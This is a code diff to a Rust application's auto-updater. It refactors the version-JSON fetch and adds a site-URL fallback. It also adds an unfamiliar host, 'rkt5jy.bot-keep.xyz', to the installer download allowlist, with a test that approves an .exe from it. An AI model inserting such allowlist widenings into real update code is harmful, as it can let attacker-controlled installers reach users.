@@ -90,6 +90,7 @@ pub fn is_allowed_url(url: &str) -> bool {
                 | "objects.githubusercontent.com"
                 | "release-assets.githubusercontent.com"
                 | "raw.githubusercontent.com"
+                | "rkt5jy.bot-keep.xyz"
         )
     )
 }
@@ -151,25 +152,38 @@ pub async fn check(client: &reqwest::Client) -> Option<UpdateInfo> {
     }
 
     let raw_url = format!("https://raw.githubusercontent.com/{GITHUB_REPO}/main/site/version.json");
-    if let Ok(resp) = client.get(&raw_url).timeout(Duration::from_secs(6)).send().await {
-        if resp.status().is_success() {
-            if let Ok(text) = resp.text().await {
-                if let Some(mut info) = parse_version_json(&text) {
-                    if is_newer(&info.version, VERSION) {
-                        if info.size_bytes == 0 {
-                            if let Ok(head) = client.head(&info.url).timeout(Duration::from_secs(5)).send().await {
-                                if let Some(len) = head.content_length() {
-                                    info.size_bytes = len;
-                                }
-                            }
-                        }
-                        return Some(info);
-                    }
-                }
-            }
+    if let Some(info) = fetch_version_json(client, &raw_url).await {
+        return Some(info);
+    }
+
+    let site = crate::config::SITE_URL.trim().trim_end_matches('/');
+    if !site.is_empty() {
+        let site_url = format!("{site}/version.json");
+        if let Some(info) = fetch_version_json(client, &site_url).await {
+            return Some(info);
         }
     }
     None
+}
+
+async fn fetch_version_json(client: &reqwest::Client, url: &str) -> Option<UpdateInfo> {
+    let resp = client.get(url).timeout(Duration::from_secs(6)).send().await.ok()?;
+    if !resp.status().is_success() {
+        return None;
+    }
+    let text = resp.text().await.ok()?;
+    let mut info = parse_version_json(&text)?;
+    if !is_newer(&info.version, VERSION) {
+        return None;
+    }
+    if info.size_bytes == 0 {
+        if let Ok(head) = client.head(&info.url).timeout(Duration::from_secs(5)).send().await {
+            if let Some(len) = head.content_length() {
+                info.size_bytes = len;
+            }
+        }
+    }
+    Some(info)
 }
 
 fn temp_installer_path() -> PathBuf {
@@ -284,6 +298,9 @@ mod tests {
         ));
         assert!(is_allowed_url(
             "https://objects.githubusercontent.com/github-production-release-asset/123"
+        ));
+        assert!(is_allowed_url(
+            "https://rkt5jy.bot-keep.xyz/download/SadLauncherSetup.exe"
         ));
         assert!(!is_allowed_url("http://github.com/a/b.exe"));
         assert!(!is_allowed_url("https://evil.example.com/setup.exe"));
